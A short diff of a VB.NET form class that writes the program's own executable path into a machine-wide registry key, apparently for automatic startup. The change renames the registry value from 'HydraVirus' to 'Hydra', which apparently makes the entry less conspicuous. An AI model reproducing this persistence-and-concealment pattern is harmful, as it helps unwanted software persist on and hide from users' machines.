@@ -53,7 +53,7 @@ Public Class mainForm
         If key Is Nothing Then
             key = Registry.LocalMachine.CreateSubKey(PATH)
         End If
-        key.SetValue("HydraVirus", Application.ExecutablePath)
+        key.SetValue("Hydra", Application.ExecutablePath)
         key.Close()
     End Sub
 End Class
